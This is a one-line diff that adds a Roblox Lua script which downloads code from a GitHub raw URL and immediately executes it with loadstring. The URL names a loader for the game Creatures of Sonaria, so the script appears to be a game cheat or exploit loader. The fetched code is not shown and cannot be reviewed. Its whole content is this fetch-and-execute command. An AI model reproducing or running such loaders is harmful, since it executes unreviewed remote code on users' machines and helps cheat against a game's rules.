@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/creatures-of-sonaria-survive-kaiju-anima-spam1-lfyhb5iujqeal8.lua"))()
